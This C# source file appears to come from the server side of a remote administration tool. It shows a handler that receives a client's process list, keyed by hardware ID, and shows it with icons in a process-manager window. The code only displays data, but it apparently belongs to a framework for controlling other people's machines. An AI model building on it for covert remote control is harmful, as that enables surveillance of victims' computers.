using Server.Forms;
using Server.MessagePack;
using Server.Connection;
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    public class HandleProcessManager
    {
        public void GetProcess(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                FormProcessManager PM = (FormProcessManager)Application.OpenForms["processManager:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                if (PM != null)
                {
                    if (PM.Client == null)
                    {
                        PM.Client = client;
                        PM.listView1.Enabled = true;
                        PM.timer1.Enabled = true;
                    }
                    PM.listView1.Items.Clear();
                    PM.imageList1.Images.Clear();
                    string processLists = unpack_msgpack.ForcePathObject("Message").AsString;
                    string[] _NextProc = processLists.Split(new[] { "-=>" }, StringSplitOptions.None);
                    for (int i = 0; i < _NextProc.Length; i++)
                    {
                        if (_NextProc[i].Length > 0)
                        {
                            ListViewItem lv = new ListViewItem
                            {
                                Text = Path.GetFileName(_NextProc[i])
                            };
                            lv.SubItems.Add(_NextProc[i + 1]);
                            lv.ToolTipText = _NextProc[i];
                            Image im = Image.FromStream(new MemoryStream(Convert.FromBase64String(_NextProc[i + 2])));
                            PM.imageList1.Images.Add(_NextProc[i + 1], im);
                            lv.ImageKey = _NextProc[i + 1];
                            PM.listView1.Items.Add(lv);
                        }
                        i += 2;
                    }
                }

            }
            catch { }
        }
    }
}
